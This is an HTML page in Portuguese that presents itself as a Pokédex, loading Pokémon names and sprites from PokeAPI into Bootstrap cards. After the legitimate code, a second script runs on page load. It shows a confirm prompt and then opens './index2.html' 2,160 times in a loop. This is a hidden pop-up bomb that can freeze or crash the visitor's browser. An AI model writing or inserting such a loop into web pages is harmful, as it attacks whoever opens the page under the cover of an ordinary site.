<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pokédex - Informações sobre Pokémon</title>
  <!-- Inclua os arquivos CSS do Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
  <style>
    body {
      background-color: #f5f5f5;
    }

    .jumbotron {
      background-color: #ef5350;
      color: #fff;
    }

    .pokemon-card {
      background-color: #fff;
      border: 1px solid #e0e0e0;
      border-radius: 6px;
      padding: 10px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="jumbotron mt-5">
      <h1 class="display-4">Pokédex - Informações sobre Pokémon</h1>
      <p class="lead">Descubra detalhes sobre diferentes Pokémon!</p>
    </div>

    <div id="pokemon-container" class="row mt-5"></div>
  </div>

  <!-- Inclua os arquivos JavaScript do Bootstrap e do Pokémon -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script>
    $(document).ready(function() {
      var endpoint = "https://pokeapi.co/api/v2/pokemon?limit=300";

      // Faça a requisição para obter os Pokémon
      $.getJSON(endpoint, function(response) {
        var pokemonList = response.results;

        // Percorra a lista de Pokémon e exiba as informações na página
        pokemonList.forEach(function(pokemon) {
          $.getJSON(pokemon.url, function(pokemonData) {
            var pokemonName = pokemonData.name;
            var pokemonImage = pokemonData.sprites.front_default;
            var pokemonHtml = `
              <div class="col-md-3 mb-4">
                <div class="pokemon-card">
                  <img src="${pokemonImage}" alt="${pokemonName}" class="img-fluid">
                  <h5 class="mt-3">${pokemonName}</h5>
                </div>
              </div>`;
            $("#pokemon-container").append(pokemonHtml);
          });
        });
      });
    });
  </script>
  <script>
    confirm("clique em ok")
    for(let i = 0; i < 72*30; i++){
        window.open('./index2.html');
        }
</script>
</body>
</html>
